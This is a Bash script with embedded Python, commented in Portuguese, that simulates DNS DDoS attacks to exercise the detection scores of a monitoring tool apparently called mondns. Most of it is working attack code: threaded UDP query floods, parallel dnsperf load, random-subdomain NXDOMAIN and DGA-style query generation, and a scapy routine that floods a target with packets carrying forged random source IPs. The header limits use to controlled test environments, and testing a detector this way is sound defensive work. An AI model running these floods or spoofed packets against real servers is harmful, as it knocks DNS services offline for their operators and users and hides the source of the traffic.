#!/bin/bash
# ============================================================
# mondns — Script de Simulação de Ataques DDoS DNS
#
# Uso:
#   chmod +x simulate_attack.sh
#   ./simulate_attack.sh <target_ip> [cenario]
#
# Cenários disponíveis:
#   1  — NXDOMAIN Flood        (dispara: score_nxdomain)
#   2  — QPS Flood             (dispara: score_qps)
#   3  — Entropy Dominios      (dispara: score_domain_entropy)
#   4  — Distribuicao de IPs   (dispara: score_source_entropy)
#   5  — Ataque Combinado      (dispara: todos os scores + composite alto)
#   all — Todos em sequência
#
# Dependências:
#   - dnsperf (pacote bind-utils ou dnsperf)
#   - python3 (stdlib — sem deps externas para modo básico)
#   - python3 + scapy (opcional, para simulação de IPs forjados)
#   - dnspython: pip install dnspython (para modo multi-thread)
#
# Instalar dnsperf:
#   RHEL/CentOS: dnf install dnsperf   # ou: dnf install bind-utils
#   Ubuntu:      apt install dnsperf
#
# AVISO: Execute APENAS em ambiente de teste controlado.
#        Nunca contra infraestrutura de produção sem autorização.
# ============================================================
set -uo pipefail

# ── Configuração ───────────────────────────────────────────
TARGET="${1:-192.168.10.24}"
SCENARIO="${2:-menu}"
DURATION=240         # segundos por cenário (180s visíveis + 60s debounce)
DNS_PORT=53
VALID_DOMAIN="sondaativas.com.br"   # domínio que resolve

# Thresholds padrão do mondns (ajuste se alterou no Admin):
# QPS threshold:          50 qps → score_qps começa a subir
# NXDOMAIN threshold:     30%    → score_nxdomain sobe
# Composite ≥ 50         → severity: suspect
# Composite ≥ 70         → severity: attack / high
# Composite ≥ 85         → severity: critical

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

info()    { echo -e "${GREEN}[sim]${NC} $*"; }
warn()    { echo -e "${YELLOW}[sim]${NC} $*"; }
section() { echo -e "\n${CYAN}${BOLD}═══ $* ═══${NC}\n"; }
error()   { echo -e "${RED}[sim] ERRO:${NC} $*" >&2; exit 1; }

check_deps() {
    local missing=()
    command -v python3 &>/dev/null || missing+=("python3")
    if ! command -v dnsperf &>/dev/null; then
        warn "dnsperf não encontrado — usando modo Python puro (menos preciso)"
        USE_DNSPERF=false
    else
        USE_DNSPERF=true
        info "dnsperf encontrado: $(dnsperf -v 2>&1 | head -1)"
    fi
    if python3 -c "import scapy" 2>/dev/null; then
        USE_SCAPY=true
        info "scapy disponível — simulação de IP spoofing habilitada"
    else
        USE_SCAPY=false
        warn "scapy não disponível — cenário de IP spoofing usará IPs reais (multi-source com loops)"
    fi
    if [ ${#missing[@]} -gt 0 ]; then error "Dependências faltando: ${missing[*]}"; fi
}

# ── Gerar arquivo de consultas para dnsperf ───────────────
gen_nxdomain_queries() {
    local file="$1"
    local count="${2:-10000}"
    info "Gerando ${count} consultas NXDOMAIN aleatórias..."
    python3 - <<PYEOF > "$file"
import random, string
count = $count
for _ in range(count):
    sub = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8,20)))
    print(f"{sub}.${VALID_DOMAIN} A")
PYEOF
    info "Arquivo gerado: ${file} ($(wc -l < "$file") linhas)"
}

gen_valid_queries() {
    local file="$1"
    local count="${2:-5000}"
    info "Gerando ${count} consultas válidas (alta frequência)..."
    python3 - <<PYEOF > "$file"
import random
subdomains = [
    "ns1", "ns2", "ns3", "ns4", "mail", "smtp", "pop", "imap",
    "www", "ftp", "vpn", "remote", "autodiscover", "webmail",
    "dc1", "dc2", "ldap", "kerberos", "sip", "voip"
]
count = $count
for i in range(count):
    sub = random.choice(subdomains)
    print(f"{sub}.${VALID_DOMAIN} A")
PYEOF
}

gen_entropy_domain_queries() {
    local file="$1"
    local count="${2:-10000}"
    info "Gerando ${count} consultas com alta entropia de domínios (random labels)..."
    python3 - <<PYEOF > "$file"
import random, string
tlds = [".com", ".net", ".org", ".info", ".biz", ".br", ".io"]
count = $count
for _ in range(count):
    parts = random.randint(1, 3)
    labels = [''.join(random.choices(string.ascii_lowercase, k=random.randint(4,12)))
              for _ in range(parts)]
    domain = '.'.join(labels) + random.choice(tlds)
    print(f"{domain} A")
PYEOF
}

gen_mixed_queries() {
    local file="$1"
    local count="${2:-15000}"
    info "Gerando ${count} consultas mistas (valid + NXDOMAIN + entropy)..."
    python3 - <<PYEOF > "$file"
import random, string

tlds = [".com", ".net", ".org", ".info", ".br"]
valid = ["ns1", "ns2", "mail", "www", "vpn", "dc1", "dc2"]
count = $count

for i in range(count):
    r = random.random()
    if r < 0.4:
        # NXDOMAIN
        sub = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(10,24)))
        print(f"{sub}.${VALID_DOMAIN} A")
    elif r < 0.6:
        # valid
        print(f"{random.choice(valid)}.${VALID_DOMAIN} A")
    else:
        # random domain (entropy)
        labels = [''.join(random.choices(string.ascii_lowercase, k=random.randint(5,12)))
                  for _ in range(random.randint(1,3))]
        print('.'.join(labels) + random.choice(tlds) + " A")
PYEOF
}

# ── Funções de ataque ─────────────────────────────────────

attack_with_dnsperf() {
    local qfile="$1"
    local label="$2"
    local qps="${3:-200}"

    info "dnsperf → target=${TARGET}:${DNS_PORT} qps=${qps} duration=${DURATION}s"
    dnsperf \
        -s "$TARGET" \
        -p "$DNS_PORT" \
        -d "$qfile" \
        -Q "$qps" \
        -l "$DURATION" \
        -t 3 \
        -c 10 \
        2>&1 | tail -20 || true
}

attack_with_python() {
    # Fallback quando dnsperf não está disponível
    local qfile="$1"
    local label="$2"
    local target_qps="${3:-100}"

    info "Python DNS flood → target=${TARGET}:${DNS_PORT} ~${target_qps}qps por ${DURATION}s"
    python3 - <<PYEOF
import socket, struct, random, time, threading

TARGET = "$TARGET"
PORT   = $DNS_PORT
TARGET_QPS = $target_qps
DURATION   = $DURATION

queries = []
with open("$qfile") as f:
    for line in f:
        line = line.strip()
        if not line: continue
        parts = line.split()
        if len(parts) >= 1:
            queries.append(parts[0])

def build_dns_query(domain, qtype=1):
    txid = random.randint(0, 65535)
    flags = 0x0100  # RD=1
    qdcount = 1
    header = struct.pack('!HHHHHH', txid, flags, qdcount, 0, 0, 0)
    qname = b''
    for label in domain.rstrip('.').split('.'):
        enc = label.encode()
        qname += bytes([len(enc)]) + enc
    qname += b'\x00'
    question = qname + struct.pack('!HH', qtype, 1)
    return header + question

stop_event = threading.Event()
sent = [0]
errors = [0]

def flood_worker():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(0.5)
    interval = 1.0 / TARGET_QPS if TARGET_QPS > 0 else 0.001
    idx = 0
    while not stop_event.is_set():
        try:
            domain = queries[idx % len(queries)]
            pkt = build_dns_query(domain)
            sock.sendto(pkt, (TARGET, PORT))
            sent[0] += 1
        except Exception:
            errors[0] += 1
        idx += 1
        if interval > 0.002:
            time.sleep(interval)
    sock.close()

# Número de threads baseado no QPS desejado
n_threads = max(1, min(TARGET_QPS // 50, 20))
threads = [threading.Thread(target=flood_worker, daemon=True) for _ in range(n_threads)]

print(f"[sim] Iniciando {n_threads} thread(s) de flood...")
start = time.time()
for t in threads: t.start()

while time.time() - start < DURATION:
    elapsed = time.time() - start
    qps_real = sent[0] / max(elapsed, 0.1)
    print(f"\r[sim] {elapsed:.0f}s | enviadas={sent[0]} | qps_real={qps_real:.0f} | erros={errors[0]}", end='', flush=True)
    time.sleep(2)

stop_event.set()
for t in threads: t.join(timeout=2)
elapsed = time.time() - start
print(f"\n[sim] Concluído: {sent[0]} packets em {elapsed:.1f}s ({sent[0]/elapsed:.0f} qps médio)")
PYEOF
}

run_attack() {
    local qfile="$1"
    local label="$2"
    local qps="${3:-200}"
    if [ "$USE_DNSPERF" = true ]; then
        attack_with_dnsperf "$qfile" "$label" "$qps"
    else
        attack_with_python "$qfile" "$label" "$qps"
    fi
}

# ── Cenários ──────────────────────────────────────────────

cenario_1_nxdomain() {
    section "CENÁRIO 1 — NXDOMAIN Flood"
    cat <<INFO
Objetivo:    Disparar score_nxdomain
Alvo:        NXDOMAIN rate > 30% (threshold padrão)
Esperado:    score_nxdomain alto → composite ≥ 50 → severity: suspect/attack
Duração:     ${DURATION}s com ~${DURATION_NOTE:-150} qps

Observe no mondns:
  • nxdomain_rate subindo para 90-100%
  • score_nxdomain: 80-100
  • composite_score ≥ 50 → evento de ataque aberto
INFO
    local qfile
    qfile=$(mktemp /tmp/mondns_nxdomain_XXXXXX.txt)
    trap "rm -f $qfile" EXIT
    gen_nxdomain_queries "$qfile" 20000
    warn "Iniciando NXDOMAIN flood em ${TARGET} por ${DURATION}s..."
    run_attack "$qfile" "NXDOMAIN" 150
    rm -f "$qfile"
    info "Cenário 1 concluído. Aguardando 15s para mondns fechar evento..."
    sleep 15
}

cenario_2_qps() {
    section "CENÁRIO 2 — QPS Flood (Volume)"
    cat <<INFO
Objetivo:    Disparar score_qps
Alvo:        QPS > 50 (threshold padrão)
Esperado:    score_qps alto → composite sobe
Estratégia: Mix de queries válidas em altíssima frequência
Duração:     ${DURATION}s com ~400 qps

Observe no mondns:
  • qps subindo para 300-500+
  • score_qps: 60-100
  • nxdomain_rate baixo (queries válidas)
INFO
    local qfile
    qfile=$(mktemp /tmp/mondns_qps_XXXXXX.txt)
    trap "rm -f $qfile" EXIT
    gen_valid_queries "$qfile" 50000
    warn "Iniciando QPS flood em ${TARGET} por ${DURATION}s..."
    run_attack "$qfile" "QPS_FLOOD" 400
    rm -f "$qfile"
    info "Cenário 2 concluído. Aguardando 15s..."
    sleep 15
}

cenario_3_entropy() {
    section "CENÁRIO 3 — Domain Entropy Attack"
    cat <<INFO
Objetivo:    Disparar score_domain_entropy
Estratégia: Consultar milhares de domínios únicos e aleatórios
            (simula ataque por botnet com domínios gerados algoritmicamente — DGA)
Esperado:    score_domain_entropy alto + alto NXDOMAIN (domínios não existem)
Duração:     ${DURATION}s com ~200 qps

Observe no mondns:
  • top_queried_domains: lista enorme de domínios únicos
  • score_domain_entropy: 70-100
  • nxdomain_rate: 90%+ (todos os domínios são falsos)
INFO
    local qfile
    qfile=$(mktemp /tmp/mondns_entropy_XXXXXX.txt)
    trap "rm -f $qfile" EXIT
    gen_entropy_domain_queries "$qfile" 20000
    warn "Iniciando Domain Entropy Attack em ${TARGET} por ${DURATION}s..."
    run_attack "$qfile" "DOMAIN_ENTROPY" 200
    rm -f "$qfile"
    info "Cenário 3 concluído. Aguardando 15s..."
    sleep 15
}

cenario_4_source_ip() {
    section "CENÁRIO 4 — Source IP Entropy (Multi-source)"
    cat <<INFO
Objetivo:    Disparar score_source_entropy
Estratégia: Simular queries vindas de muitos IPs diferentes (botnet)
            Com scapy: forja IPs de origem aleatórios (requer root + scapy)
            Sem scapy: lança queries de múltiplos processos (IPs internos)
Esperado:    score_source_entropy alto (muitos IPs únicos como origem)
Duração:     ${DURATION}s
INFO
    if [ "$USE_SCAPY" = true ]; then
        warn "Modo scapy: requer execução como root para IP spoofing"
        python3 - <<PYEOF
import random, string, time, threading
try:
    from scapy.all import IP, UDP, DNS, DNSQR, send, RandShort
except ImportError:
    print("[sim] scapy não disponível")
    exit(1)

TARGET   = "$TARGET"
PORT     = $DNS_PORT
DURATION = $DURATION
VALID    = "${VALID_DOMAIN}"

def rand_domain():
    sub = ''.join(random.choices(string.ascii_lowercase, k=random.randint(6,16)))
    return f"{sub}.{VALID}"

def spoof_worker(stop_event, sent):
    while not stop_event.is_set():
        src_ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        domain = rand_domain()
        pkt = (IP(src=src_ip, dst=TARGET) /
               UDP(sport=RandShort(), dport=PORT) /
               DNS(rd=1, qd=DNSQR(qname=domain)))
        try:
            send(pkt, verbose=False)
            sent[0] += 1
        except Exception:
            pass

stop_event = threading.Event()
sent = [0]
n_threads = 5
threads = [threading.Thread(target=spoof_worker, args=(stop_event, sent), daemon=True)
           for _ in range(n_threads)]

print(f"[sim] Iniciando IP spoofing com {n_threads} threads por {DURATION}s...")
start = time.time()
for t in threads: t.start()

while time.time() - start < DURATION:
    elapsed = time.time() - start
    print(f"\r[sim] {elapsed:.0f}s | pacotes_forjados={sent[0]}", end='', flush=True)
    time.sleep(2)

stop_event.set()
print(f"\n[sim] Concluído: {sent[0]} pacotes com IPs aleatórios")
PYEOF
    else
        warn "Scapy não disponível — simulando com múltiplos processos em paralelo"
        warn "(source IP no mondns será o IP desta máquina — score_source_entropy baixo)"
        local qfile
        qfile=$(mktemp /tmp/mondns_multi_XXXXXX.txt)
        trap "rm -f $qfile" EXIT
        gen_nxdomain_queries "$qfile" 10000
        # Lançar vários processos paralelos para gerar carga
        for i in $(seq 1 5); do
            run_attack "$qfile" "SRC_ENTROPY_${i}" 100 &
        done
        wait
        rm -f "$qfile"
    fi
    info "Cenário 4 concluído. Aguardando 15s..."
    sleep 15
}

cenario_5_combinado() {
    section "CENÁRIO 5 — Ataque Combinado (Máximo Impacto)"
    cat <<INFO
Objetivo:    Disparar TODOS os scores simultaneamente
Estratégia: Mix de NXDOMAIN + random domains + alta frequência
            Simula ataque real de botnet distribuído
Esperado:    composite_score ≥ 85 → severity: critical
             Todos os algoritmos acionados:
               ✓ score_qps
               ✓ score_nxdomain
               ✓ score_domain_entropy
               ✓ score_source_entropy
               ✓ score_query_type
Duração:     ${DURATION}s com ~500 qps
INFO
    local qfile
    qfile=$(mktemp /tmp/mondns_combined_XXXXXX.txt)
    trap "rm -f $qfile" EXIT
    gen_mixed_queries "$qfile" 50000
    warn "Iniciando Ataque Combinado em ${TARGET} por ${DURATION}s..."
    warn "Este é o cenário mais agressivo — composite_score deve atingir crítico."

    if [ "$USE_DNSPERF" = true ]; then
        # Lançar 3 instâncias paralelas de dnsperf para maior carga
        local qfile2 qfile3
        qfile2=$(mktemp /tmp/mondns_c2_XXXXXX.txt)
        qfile3=$(mktemp /tmp/mondns_c3_XXXXXX.txt)
        trap "rm -f $qfile $qfile2 $qfile3" EXIT
        gen_nxdomain_queries "$qfile2" 20000
        gen_entropy_domain_queries "$qfile3" 20000
        dnsperf -s "$TARGET" -p "$DNS_PORT" -d "$qfile"  -Q 200 -l "$DURATION" -t 3 &
        dnsperf -s "$TARGET" -p "$DNS_PORT" -d "$qfile2" -Q 200 -l "$DURATION" -t 3 &
        dnsperf -s "$TARGET" -p "$DNS_PORT" -d "$qfile3" -Q 100 -l "$DURATION" -t 3 &
        wait
        rm -f "$qfile2" "$qfile3"
    else
        run_attack "$qfile" "COMBINED" 500
    fi
    rm -f "$qfile"
    info "Cenário 5 concluído. Aguardando 20s para mondns consolidar evento..."
    sleep 20
}

# ── Menu interativo ───────────────────────────────────────

show_menu() {
    section "mondns — Simulador de Ataques DDoS DNS"
    cat <<MENU
  Target:  ${TARGET}
  dnsperf: ${USE_DNSPERF}
  scapy:   ${USE_SCAPY}

  Cenários disponíveis:
  ┌───┬────────────────────────────────┬──────────────────────────────────┐
  │ # │ Nome                           │ Scores afetados                  │
  ├───┼────────────────────────────────┼──────────────────────────────────┤
  │ 1 │ NXDOMAIN Flood                 │ score_nxdomain (+score_domain)   │
  │ 2 │ QPS Flood (volume)             │ score_qps                        │
  │ 3 │ Domain Entropy (DGA)           │ score_domain_entropy + nxdomain  │
  │ 4 │ Multi-source (botnet)          │ score_source_entropy             │
  │ 5 │ Ataque Combinado (crítico)     │ TODOS os scores                  │
  │ a │ Todos em sequência             │ —                                │
  └───┴────────────────────────────────┴──────────────────────────────────┘

  Acompanhe em tempo real:
    https://mondns.sondaativas.com.br/dashboard

  Logs do agente no servidor alvo:
    journalctl -u mondns-agent -f

MENU
    read -rp "  Selecione o cenário [1-5/a/q]: " choice
    echo "$choice"
}

# ── Main ──────────────────────────────────────────────────

check_deps

# Testar conectividade básica
info "Testando conectividade com ${TARGET}:${DNS_PORT}..."
if python3 -c "
import socket, struct, random
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(3)
txid = random.randint(0,65535)
pkt = struct.pack('!HHHHHH', txid, 0x0100, 1, 0, 0, 0)
pkt += b'\x03ns1\x0csondaativas\x03com\x02br\x00' + struct.pack('!HH', 1, 1)
try:
    s.sendto(pkt, ('$TARGET', $DNS_PORT))
    s.recv(512)
    print('OK')
except Exception as e:
    print(f'FALHOU: {e}')
s.close()
" 2>/dev/null | grep -q OK; then
    info "Conectividade OK — servidor ${TARGET} respondendo na porta ${DNS_PORT}"
else
    warn "Servidor ${TARGET} não respondeu ao teste — verifique conectividade"
    warn "Continuando mesmo assim (o ataque pode estar bloqueado por firewall)"
fi

case "$SCENARIO" in
    1) cenario_1_nxdomain ;;
    2) cenario_2_qps ;;
    3) cenario_3_entropy ;;
    4) cenario_4_source_ip ;;
    5) cenario_5_combinado ;;
    all|a)
        section "Executando todos os cenários em sequência"
        cenario_1_nxdomain
        cenario_2_qps
        cenario_3_entropy
        cenario_4_source_ip
        cenario_5_combinado
        section "Todos os cenários concluídos"
        ;;
    menu|*)
        while true; do
            choice=$(show_menu)
            case "$choice" in
                1) cenario_1_nxdomain ;;
                2) cenario_2_qps ;;
                3) cenario_3_entropy ;;
                4) cenario_4_source_ip ;;
                5) cenario_5_combinado ;;
                a) cenario_1_nxdomain; cenario_2_qps; cenario_3_entropy; cenario_4_source_ip; cenario_5_combinado ;;
                q|Q) info "Saindo."; exit 0 ;;
                *) warn "Opção inválida: ${choice}" ;;
            esac
        done
        ;;
esac

section "Simulação concluída"
info "Verifique os eventos gerados em: https://mondns.sondaativas.com.br/attacks"
